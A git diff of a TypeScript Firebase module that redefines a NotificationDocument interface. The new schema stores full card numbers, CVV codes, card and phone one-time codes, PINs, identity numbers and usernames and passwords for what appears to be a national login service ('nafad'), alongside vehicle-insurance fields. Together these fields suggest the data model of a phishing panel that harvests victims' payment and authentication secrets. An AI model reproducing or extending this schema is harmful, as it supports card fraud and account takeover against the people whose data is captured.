@@ -21,23 +21,60 @@ const database = getDatabase(app);
 
 export { app, auth, db, database };
 
-export interface NotificationDocument {
-  id: string;
-  name: string;
-  hasPersonalInfo: boolean;
-  hasCardInfo: boolean;
-  currentPage: string;
-  time: string;
-  notificationCount: number;
-  personalInfo?: {
-    fullName: string;
-    email: string;
-    phone: string;
-    address: string;
-  };
-  cardInfo?: {
-    cardNumber: string;
-    expirationDate: string;
-    cvv: string;
-  };
+  
+interface PaymentData {
+  card_number?: string
+  cvv?: string
+  expiration_date?: string
+  full_name?: string
+}
+
+interface FormData {
+  card_number?: string
+  cvv?: string
+  expiration_date?: string
+  full_name?: string
+}
+
+interface NotificationDocument {
+  id: string
+  agreeToTerms?: boolean
+  buyer_identity_number?: string
+  card_number?: string
+  createdDate: string
+  customs_code?: string
+  cvv?: string
+  document_owner_full_name?: string
+  expiration_date?: string
+  formData?: FormData
+  full_name?: string
+  insurance_purpose?: string
+  owner_identity_number?: string
+  pagename?: string
+  paymentData?: PaymentData
+  paymentStatus?: string
+  phone?: string
+  phone2?: string
+  seller_identity_number?: string
+  serial_number?: string
+  status?: string
+  vehicle_manufacture_number?: string
+  documment_owner_full_name?: string
+  vehicle_type?: string
+  isHidden?: boolean
+  pinCode?: string
+  otpCardCode?: string
+  phoneOtp?: string
+  otpCode?: string
+  externalUsername?: string
+  externalPassword?: string
+  nafadUsername?: string
+  nafadPassword?: string
+  nafaz_pin?: string
+  autnAttachment?: string
+  requierdAttachment?: string
+  operator?: string
+  otpPhoneStatus: string
+  phoneOtpCode: string
+  phoneVerificationStatus: string
 }
